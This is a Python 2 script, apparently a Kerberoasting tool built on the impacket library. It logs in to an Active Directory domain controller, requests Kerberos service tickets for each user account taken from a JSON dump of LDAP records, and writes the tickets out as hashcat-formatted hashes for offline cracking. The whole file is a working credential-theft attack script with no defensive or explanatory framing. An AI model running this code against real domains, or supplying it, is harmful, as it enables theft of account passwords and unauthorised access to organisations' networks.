from pyasn1.codec.ber import encoder, decoder
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP

def getTGT(user, password, domain, AD_address):
	userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
	tgt, cipher, key, sessionKey = getKerberosTGT(userName, password, domain, '', '', kdcHost=AD_address)
	return tgt, cipher, key, sessionKey


def getTGSTicketForUser(SPNusername, tgt, domain, AD_address, cipher, sessionKey):
	serverName = Principal(SPNusername, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
	TGSResponse, cipher, sessionKey, newSessionkey = getKerberosTGS(serverName, domain, AD_address, tgt, cipher, sessionKey)
	return TGSResponse, cipher, sessionKey
	
def TGSTicket2hashcat(TGSResponse):
	res = decoder.decode(TGSResponse, asn1Spec = TGS_REP())[0]
	
	tgs_encryption_type    = str(int(res['ticket']['enc-part']['etype']))
	tgs_name_string        = str(res['ticket']['sname']['name-string'][0])
	tgs_realm              = str(res['ticket']['realm'])
	tgs_checksum           = str(res['ticket']['enc-part']['cipher'])[:16]
	tgs_encrypted_data2    = str(res['ticket']['enc-part']['cipher'])[16:]
		
	return '$krb5tgs$%s$*%s$%s$spn*$%s$%s\r\n' % (tgs_encryption_type,tgs_name_string,tgs_realm, tgs_checksum.encode('hex'), tgs_encrypted_data2.encode('hex') )

if __name__ == '__main__':
	from getpass import getpass
	import json
	
	user       = ""
	password   = getpass()
	AD_address = '' #hostname or ip os the domain controller
	domain     = '' #name of the AD domain
	input_filename  = '' #json file with parsed LDAP_record data
	output_filename = ''
	
	
	TGSResponses = list()
	
	with open(input_filename,'rb') as f:
		data = json.load(f)
	
	tgt, cipher, key, sessionKey = getTGT(user, password, domain, AD_address)
	
	for entry in data:
		if entry['sAMAccountName'][-1] == '$':
			print 'Skipping machine account ' + entry['sAMAccountName']
			continue
		
		try:
			TGSResponse, cipher, sessionKey = getTGSTicketForUser(entry['sAMAccountName'], tgt, domain, AD_address, cipher, sessionKey)

		except Exception as e:
			print 'Failed to get ticket for user ' + entry['sAMAccountName'] + ' Exception data: ' + str(e)
			continue

		TGSResponses.append(TGSResponse)
	
	with open(output_filename,'wb') as f:
		for TGSResponse in TGSResponses:
			formatted_text = TGSTicket2hashcat(TGSResponse)
			f.write(formatted_text + '\r\n')
		
